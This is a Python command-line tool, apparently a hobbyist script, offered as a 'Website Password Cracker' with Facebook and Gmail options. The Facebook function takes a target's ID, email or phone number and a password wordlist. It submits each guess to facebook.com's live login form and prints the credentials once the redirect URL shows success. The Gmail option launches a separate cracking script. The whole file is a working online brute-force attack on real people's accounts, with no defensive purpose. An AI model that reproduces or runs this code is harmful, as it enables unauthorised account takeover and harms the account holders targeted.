import mechanize
import time
import os
br = mechanize.Browser()
br.set_handle_robots(False)
br.addheaders = [('User-agent','Firefox')]

def facebook():
	os.system('clear')
	print('\n')
	print('\t \t \x1b[1;34mFACEBOOK\x1b[1;m \n \n')
	targetid = input('Target ID or Email or PhoneNumber : ')
	wordlist = input('Password list(wordlist) : ')
	try:
		passwords = open(wordlist, 'r')
	except:
		print('\nNOT FOUND PASSWORD FILE!')
	print('')
	print('\x1b[1;31m####################\x1b[1;m', '\x1b[1;35mSTART ATTACK\x1b[1;m', '\x1b[1;31m####################\x1b[1;m')
	print('')
	for password in passwords:
		br.open('https://www.facebook.com/login.php')
		br.select_form(nr=0)
		br.form['email'] = targetid
		br.form['pass'] = password
		sub = br.submit()
		geturl = sub.geturl()
		if geturl == 'https://www.facebook.com/':
			print('')
			print('\x1b[1;33m==========================\x1b[1;m', '\x1b[1;32mSUCCESS\x1b[1;m', '\x1b[1;33m============================ \x1b[1;m')
			print('\x1b[1;33m*\x1b[1;m')
			print('\x1b[1;33m* \tUSERNAME [\x1b[1;m', '\x1b[1;35m{}\x1b[1;m'.format(targetid), '\x1b[1;33m]   PASSWORD [\x1b[1;m', '\x1b[1;35m{}\x1b[1;m'.format(password.strip()), '\x1b[1;33m]\x1b[1;m')
			print('\x1b[1;33m*\x1b[1;m')
			print('\x1b[1;33m==========================\x1b[1;m', '\x1b[1;32mSUCCESS\x1b[1;m', '\x1b[1;33m============================ \x1b[1;m')
			break
		elif geturl == 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100':
			print('fail..  {} : {}'.format(targetid, password.strip()))
		else:
			print('nomally fail..  {} : {}'.format(targetid, password.strip()))

def Gmail():
	os.system('python3 Data/gmailcrack.py')

def websitecrack():
	os.system('clear')
	print('\n')
	print('======================   MADE : nagong(나공)')
	print('*       V 0.63       *   Email : omh02033@gmail.com')
	print('======================   kakaotalk : sansogknnamu')
	print('\n')
	print(' 1) facebook')
	print('\n 2) Gmail')
	print('')
	print('\n\t99) exit')
	ma = input('\n > ')
	if ma == '1':
		facebook()
	elif ma == '2':
		Gmail()
	elif ma == '99':
		exit()
	else:
		print('error')


running = 1
while running:
	os.system('clear')
	print('\n')
	print('======================   MADE : nagong(나공)')
	print('*       V 0.63       *   Email : omh02033@gmail.com')
	print('======================   kakaotalk : sansogknnamu')
	print('\n')
	print(' 1) Website Password Cracker')
	print('')
	print('\n\t99) exit')
	ma = input('\n > ')
	if ma == '1':
		websitecrack()
	elif ma == '99':
		exit()
	else:
		print('error')
	running = 0